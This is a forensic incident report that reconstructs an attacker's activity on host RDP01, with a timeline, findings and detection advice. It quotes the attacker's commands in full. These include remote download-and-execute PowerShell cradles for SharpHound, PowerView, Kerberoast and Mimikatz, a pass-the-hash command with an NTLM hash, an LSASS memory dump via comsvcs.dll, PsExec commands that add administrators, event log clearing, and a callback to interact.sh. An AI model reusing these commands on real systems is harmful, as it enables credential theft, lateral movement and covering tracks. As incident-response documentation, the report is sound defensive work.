# Forensic Analysis for KC3 - RDP01

**TimeLine:**

**Outside Scope:**

| last_visit_time | visit_count | visited_url | Browser | User |
| -- | -- | -- | -- | -- |
| 2022-02-19T22:29:44Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view?usp=sharing | Chrome | Administrator |
| 2022-02-19T22:29:47Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view | Chrome | Administrator |
| 2022-02-19T22:29:50Z | 1 | https://drive.google.com/uc?id=1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx&export=download | Chrome | Administrator |

**In Scope:**

| Timestamp | Activity |
| -- | -- |
| ??/??/?? ??:??:?? | **SharpHound - Powershell History (PSReadLine)** <br/> iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly |
| ??/??/?? ??:??:?? | mv .\20220219201253_BloodHound.zip .\Desktop\ |
| ??/??/?? ??:??:?? | **Port Scan - Powershell History (PSReadLine)** <br/> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan |
| ??/??/?? ??:??:?? | **Find Shares - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computerfile C:\Users\pat.risus\Desktop\computers.txt <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess \\files.magnumtempusfinacial.com <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername files.magnumtempusfinacial.com <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess -computername 172.16.50.110 |
| ??/??/?? ??:??:?? | **Kerberoasting - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat |
| ??/??/?? ??:??:?? | **MimiKatz - Powershell History (PSReadLine)** <br/> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam" <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' <br/> Invoke-Mimikatz -Command 'privilege::debug token::elevate "sekurlsa::pth /user:administrator /domain:magnumtempus /ntlm:d5e30a3f0a23e3a954d8b579a2ca8dd4"' |
| ??/??/?? ??:??:?? | **Clear Event Logs - Powershell History (PSReadLine)** <br/> clear-eventlog -log application,system,security <br/> get-eventlog --list <br/> get-eventlog -list |
| ??/??/?? ??:??:?? | **File Download - Powershell History (PSReadLine)** <br/> wget c88nc6r2vtc00001pg0ggrrksdcyyyyyb.interact.sh |
| ??/??/?? ??:??:?? | **Move Files - Powershell History (PSReadLine)** <br/> mv .\1.txt .\Desktop\ <br/> mv .\2.txt .\Desktop\ <br/> mv .\3.txt .\Desktop\ |
| 02/19/2022 20:08 GMT (12:08PM PST) | **KC3 Begin (All run from RDP box)** |
| 2022-02-19 20:12:55 | **File Created ($MFT):** \Users\pat.risus\Desktop\20220219201253_BloodHound.zip |
| 2022-02-19 20:12:55 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\20220219201253_BloodHound.lnk) Access: ..\..\..\..\..\Desktop\20220219201253_BloodHound.zip |
| 2022-02-19 20:13:40 | **Execution LNK File Created ($MFT):** \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\20220219201253_BloodHound.lnk |
| 2022-02-19T20:13:31Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://file.pizza/ |
| 2022-02-19T20:17:42Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://transfer.sh/ |
| 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.gnmap |
| 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.nmap |
| 2022-02-19 20:15:43 | **SMBScan File Created ($MFT)** -  C:\Users\pat.risus\smbScan.xml |
| 2022-02-19 20:15:43 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\smbScan.gnmap.lnk) Access: ..\..\..\..\..\smbScan.gnmap |
| 2022-02-19 20:19:57 | **Execution SMBScan File Created ($MFT)** -  C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\smbScan.gnmap.lnk |
| 2022-02-19 20:25:13 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\computers.lnk) Access: ..\..\..\..\..\..\brent.socium\Desktop\computers.txt |
| 2022-02-19T20:41:37Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://interact.sh/ |
| 2022-02-19T20:41:35Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://github.com/projectdiscovery/interactsh |
| 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://interactsh.com/ |
| 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://app.interactsh.com/ |
| 2022-02-19T20:41:58Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://app.interactsh.com/#/ |
| 2022-02-19T20:43:37Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://www.google.com/search?q=wormhole&rlz=1C1GCEA_enUS993US993&oq=wormhole&aqs=chrome.0.0i433i512l4j0i512l2j0i433i512l2j0i512l2.2376j1j7&sourceid=chrome&ie=UTF-8 |
| 2022-02-19T20:43:43Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/ |
| 2022-02-19T20:45:12Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/#ion-speak-baton |
| 2022-02-19T20:45:13Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/# |
| 2022-02-19T20:45:15Z | **Indications of possible Exfil** - Chrome (pat.risus) - https://webwormhole.io/#jump-hull-rerun |
| 2022-02-19 20:47:03 | **LSASS Memory Dump File Creation** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP <br/> C:\Windows\System32\Taskmgr.exe |
| 2022-02-19 20:47:03 | **File Create ($MFT)** - C:\Users\pat.risus\AppData\Local\Temp\lsass.DMP |
| 2022-02-19 20:48:46 | **Process Dump via Rundll32 and Comsvcs.dll + Process Dump via Comsvcs DLL** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Windows\System32\rundll32.exe <br/> "C:\windows\system32\rundll32.exe" - C:\windows\System32\comsvcs.dll MiniDump 828 C:\dump full |
| 2022-02-19 20:48:46 | \dump - File created in $MFT (203,344,847 bytes) |
| 2022-02-19 20:51:37 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 20:52:12 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19T20:52:59Z | Chrome (pat.risus) - https://www.google.com/search?q=psexec64+download&rlz=1C1GCEA_enUS993US993&oq=psexec64+download&aqs=chrome.0.0i512l2j0i22i30l3.2452j1j7&sourceid=chrome&ie=UTF-8 |
| 2022-02-19T20:53:02Z | Chrome (pat.risus) - https://live.sysinternals.com/ |
| 2022-02-19 20:53:09 | **File Create ($MFT)** - C:\Users\brent.socium\PsExec64.exe |	
| 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Lsa\lmcompatibilitylevel |
| 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\NtlmMinClientSec |
| 2022-02-19 20:54:55 | **NetNTLM Downgrade Attack** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKLM\System\CurrentControlSet\Control\Ls a\MSV1_0\RestrictSendingNTLMTraffic |
| 2022-02-19 20:59:36 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:02:26 | **File Create ($MFT)** - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\brent.socium.lnk |
| 2022-02-19 21:03:09 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:03:20 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Windows\System32\whoami.exe "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:03:30 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:04:19 | **File Create ($MFT)** - C:\Users\brent.socium\Desktop\1.txt |
| 2022-02-19 21:04:19 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\1.lnk) Access: ..\..\..\..\..\..\brent.socium\1.txt |
| 2022-02-19 21:04:22 | **File Create** ($MFT) - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\1.lnk |
| 2022-02-19 21:04:43 | **File Create** ($MFT) - C:\Users\brent.socium\Desktop\2.txt |
| 2022-02-19 21:04:43 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\2.lnk) Access: ..\..\..\..\..\..\brent.socium\2.txt |
| 2022-02-19 21:04:44 | **File Create** ($MFT) - C:\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\2.lnk |
| 2022-02-19 21:05:08 | **File Create** ($MFT) - C:\Users\brent.socium\Desktop\3.txt |
| 2022-02-19 21:05:08 | **LNK File** (\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\3.lnk) Access: ..\..\..\..\..\..\brent.socium\3.txt |
| 2022-02-19 21:05:09 | **File Create ($MFT)** - C\Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\3.lnk |
| 2022-02-19 21:12:29 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:12:58 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:12:58 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\pat.risus\Desktop\computers.txt net localgroup administrators combosecurity /ADD |
| 2022-02-19 21:14:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:14:28 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/>.\PsExec64.exe @C:\Users\brent.socium\Desktop\computers.txt net localgroup administrators combosecurity /ADD |
| 2022-02-19 21:15:07 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted | 
| 2022-02-19 21:15:07 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\computers.txt net localgroup admin istrators combosecurity /ADD |
| 2022-02-19 21:15:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:15 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:34 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:15 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:28 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:34 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:17:46 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:17:59 | **Local Accounts Discovery + Whoami Execution** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:18:28 | **Local Accounts Discovery + Whoami Execution Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - "C:\Windows\system32\whoami.exe" /user |
| 2022-02-19 21:19:03 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:03 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\3.txt net localgroup administrators jimbo /ADD |
| 2022-02-19 21:19:10 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:19 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:46 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExe c\EulaAccepted |
| 2022-02-19 21:19:46 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\2.txt net localgroup administrators hass /ADD |
| 2022-02-19 21:21:25 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:21:25 | **Adding Users/Admins** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - C:\Users\brent.socium\PsExec64.exe <br/> .\PsExec64.exe @C:\Users\brent.socium\Desktop\1.txt net localgroup administrator s andy /ADD |
| 2022-02-19 21:21:32 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:25:36 | **File Create ($MFT)** - C:\Users\brent.socium\computers.txt	|
| 2022-02-19 21:26:43 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:28:17 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:30:03 | **Usage of Sysinternals Tools** (Microsoft-Windows-Sysmon%4Operational.evtx) <br/> "rdp01.magnumtempus.financial" - HKU\.DEFAULT\Software\Sysinternals\PsExec\EulaAccepted |
| 2022-02-19 21:30:44 | **Security Audit Event Logs Cleared** (id: 1102) |
| 2022-02-19 21:30:44 | **System Audit Event Logs Cleared** (id 104) |
| 02/19/2022 21:37 GMT (01:37PM PST) | **Complete** |

---

**Conclusion:**
Wide and varied hostile behavior - See the above Time Line for details.  Hostile activity includes evidence of: Bloodhound, Port Scanning, Scanning for SMB Shares,
Kerberoasting, Mimikatz, Clearing of Event Logs, Usage of Callback/OOB tools (interact.sh), Possible Data Exfil, LSASS Memory Dump (Credential Haresting), 
NTLM Downgrading attack, Local Account Discovery, Hostile Account Creation (Administrators), Sysinternals (PsExec) Usage.

A veritable smorgasbord of mischievous roguishness.

---

**Note:** Since Security Audit Event Logs AND System Audit Event Logs were Cleared, SPLUNK, ELK, SecOnion or Graylog need to be reiewed for Hostile Actiity
  - 4625 Messages from Windows Security Event Log (Brute Force, Password Spray)
  - 4624 LogonType 10 events in the Windows Security Event Log for RDP 
  - 4769 logged multiple times for indication of kerberoasting. Should have Ticket Encryption set to: 0x17 (downgrade to RC4)
    (note: This may not always indicate kerberoasting - Look for lots of ticket requests with NO SUBSEQUENT LOGINS)

---

**Additional Supporting Files retrieved:**

* C:\dump
  - **2022-02-19 20:48:46**: Process Dump via Rundll32 and Comsvcs.dll (Dumps LSASS for Cred Harvesting)
* C:\Users\brent.socium\Desktop\computers.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:12:58**: .\PsExec64.exe @C:\Users\pat.risus\Desktop\computers.txt net localgroup administrators combosecurity /ADD
* C:\Users\brent.socium\Desktop\3.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:19:03**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\3.txt net localgroup administrators jimbo /ADD
* C:\Users\brent.socium\Desktop\2.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:19:46**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\2.txt net localgroup administrators hass /ADD
* C:\Users\brent.socium\Desktop\1.txt
  - List of IP Addresses used to Add Unauthorized ID to local administrators group
  - **2022-02-19 21:21:25**: .\PsExec64.exe @C:\Users\brent.socium\Desktop\1.txt net localgroup administrator s andy /ADD
* C:\Users\pat.risus\Desktop\20220219201253_BloodHound.zip
  - Bloodhound (SharpHound.ps1) output: Computers, Domains, GPOs, Groups, OUs, Users
  - **Powershell History (PSReadLine)** iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1') ; invoke-bloodhound -Collectionmethod dconly
  - **2022-02-19 20:12:55**: File Created ($MFT): \Users\pat.risus\Desktop\20220219201253_BloodHound.zip 
* C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP
  - LSASS Memory Dump (Cred Harvesting)
  - **2022-02-19 20:47:03**: C:\Users\PAT~1.RIS\AppData\Local\Temp\lsass.DMP - C:\Windows\System32\Taskmgr.exe
* C:\Users\pat.risus\smbScan.gnmap
  - **AllFormatsOut**: Grepable NMAP
  - Output of: Invoke-Portscan.ps1 v0.13 scan
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.gnmap
* C:\Users\pat.risus\smbScan.nmap
  - **AllFormatsOut**: NMAP
  - Output of: Invoke-Portscan.ps1 v0.13
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.nmap
* C:\Users\pat.risus\smbScan.xml
  - **AllFormatsOut**: XML
  - Output of: Invoke-Portscan.ps1 v0.13 scan
  - IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); invoke-portscan -hosts 172.16.50.0/24 -ports "445" -AllformatsOut smbScan
  - **2022-02-19 20:15:43**: SMBScan File Created ($MFT) -  C:\Users\pat.risus\smbScan.xml

---

**Finding 1:** Interesting LNK Files:

```
SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\1.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified: 2022-02-19 21:04:22
SourceAccessed:2022-03-05 17:11:45
TargetCreated: 2022-02-19 21:04:19
TargetModified: 2022-02-19 21:04:19
TargetAccessed: 2022-02-19 21:04:19
FileSize: 0
RelativePath: ..\..\..\..\..\..\brent.socium\1.txt

SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\2.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified:2022-02-19 21:04:44
SourceAccessed: 2022-03-05 17:11:45
TargetCreated: 2022-02-19 21:04:43
TargetModified: 2022-02-19 21:04:43
TargetAccessed: 2022-02-19 21:04:43
FileSize: 0
RelativePath: ..\..\..\..\..\..\brent.socium\2.txt

SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\20220219201253_BloodHound.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified:2022-02-19 20:13:40
SourceAccessed: 2022-03-05 17:11:45
TargetCreated: 2022-02-19 20:12:55
TargetModified: 2022-02-19 20:12:55
TargetAccessed: 2022-02-19 20:12:55
FileSize: 15865
RelativePath: ..\..\..\..\..\Desktop\20220219201253_BloodHound.zip

SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\3.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified:2022-02-19 21:05:09
SourceAccessed: 2022-03-05 17:11:45
TargetCreated: 2022-02-19 21:05:08
TargetModified: 2022-02-19 21:05:08
TargetAccessed: 2022-02-19 21:05:08
FileSize: 0
RelativePath: ..\..\..\..\..\..\brent.socium\3.txt

SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\computers.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified:2022-02-19 21:27:51
SourceAccessed: 2022-03-05 17:11:45
TargetCreated: 2022-02-19 20:25:13
TargetModified: 2022-02-19 20:25:20
TargetAccessed: 2022-02-19 20:25:13
FileSize: 268
RelativePath: ..\..\..\..\..\..\brent.socium\Desktop\computers.txt

SourceFile: \Users\pat.risus\AppData\Roaming\Microsoft\Windows\Recent\smbScan.gnmap.lnk
SourceCreated: 2022-03-05 17:11:45
SourceModified:2022-02-19 20:19:57
SourceAccessed: 2022-03-05 17:11:45
TargetCreated: 2022-02-19 20:15:43
TargetModified: 2022-02-19 20:19:14
TargetAccessed: 2022-02-19 20:15:43
FileSize: 9675
RelativePath: ..\..\..\..\..\smbScan.gnmap
```

---

**Finding 2:** Interesting Large Files ($MFT):

| File | Date | Date | Date | Size |
| -- | -- | -- | -- | -- |
| \dump | 2022-02-19 20:48:46 | 2022-02-19 20:48:46 | 2022-02-19 20:48:47 | 203,344,847 |
| \Users\Administrator\AppData\Local\Temp\2\tmp4035962099.zip | 2022-02-19 22:30:15 | 2022-02-19 22:30:15 | 2022-02-19 22:30:15 | 1,146,971,415 |
| \Users\Administrator\AppData\Local\Temp\2\tmp3956170113.raw | 2022-02-19 22:30:16 | 2022-02-19 22:30:16 | 2022-02-19 22:31:14 | 5,305,794,560 |

---

**Finding 3:** Exfil Attempts by pat.risus:

| last_visit_time | visit_count | visited_url | Browser | User |
| -- | -- | -- | -- | -- |
| 2022-02-19T22:29:44Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view?usp=sharing | Chrome | Administrator |
| 2022-02-19T22:29:47Z | 1 | https://drive.google.com/file/d/1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx/view | Chrome | Administrator |
| 2022-02-19T22:29:50Z | 1 | https://drive.google.com/uc?id=1QwcBy3ukLWzRkDb7rmuSEHwQFVUYN2Fx&export=download | Chrome | Administrator |
| 2022-02-19T20:13:31Z | 1 | https://file.pizza/ | Chrome | pat.risus |
| 2022-02-19T20:17:42Z | 1 | https://transfer.sh/ | Chrome | pat.risus |
| 2022-02-19T20:41:37Z | 2 | https://interact.sh/ | Chrome | pat.risus |
| 2022-02-19T20:41:35Z | 1 | https://github.com/projectdiscovery/interactsh | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://interactsh.com/ | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://app.interactsh.com/ | Chrome | pat.risus |
| 2022-02-19T20:41:58Z | 1 | https://app.interactsh.com/#/ | Chrome | pat.risus |
| 2022-02-19T20:43:37Z | 2 | https://www.google.com/search?q=wormhole&rlz=1C1GCEA_enUS993US993&oq=wormhole&aqs=chrome.0.0i433i512l4j0i512l2j0i433i512l2j0i512l2.2376j1j7&sourceid=chrome&ie=UTF-8 | Chrome | pat.risus |
| 2022-02-19T20:43:43Z | 1 | https://webwormhole.io/ | Chrome | pat.risus |
| 2022-02-19T20:45:12Z | 1 | https://webwormhole.io/#ion-speak-baton | Chrome | pat.risus |
| 2022-02-19T20:45:13Z | 1 | https://webwormhole.io/# | Chrome | pat.risus |
| 2022-02-19T20:45:15Z | 1 | https://webwormhole.io/#jump-hull-rerun | Chrome | pat.risus |
